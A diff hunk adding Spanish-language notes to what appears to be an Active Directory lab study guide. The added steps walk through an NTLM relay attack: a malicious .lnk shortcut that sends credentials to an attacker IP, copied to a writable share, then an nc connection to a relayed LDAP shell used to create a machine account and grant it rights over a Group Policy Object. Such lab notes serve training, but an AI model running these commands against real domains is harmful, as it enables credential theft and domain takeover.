@@ -215,6 +215,26 @@ En nuestra maquina dberemos de crear un acceso directo *.lnk*
 C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command "Invoke-WebRequest -Uri 'http://172.16.100.X' -UseDefaultCredentials"
 ```
 
-Deberemos c
+Deberemos copiarlo al recurso sobre el que podemos escribir
+```sehll
+xcopy C:\AD\Tools\studentx.lnk \\dcorp-ci\AI
+```
+
+Y en el WSL se ejecutara el archivo que hemos envia permitiendonos acceder a una shell de *LDAP*
+```shell
+nc 127.0.0.1 11000
+```
+
+Deberemos de crear un nuevo equipo
+```shell
+add_computer stdX-gpattack Secretpass@123
+```
+
+Y añadir este a la Politica (El SID de la politica se obtiene ejecutando `)
+```shell
+write_gpo_dacl stdX-gpattack$ {0BF8D01C-1F62-4BDC-958C-57140B67D147}
+```
+
+
 ## Movimiento Lateral
 
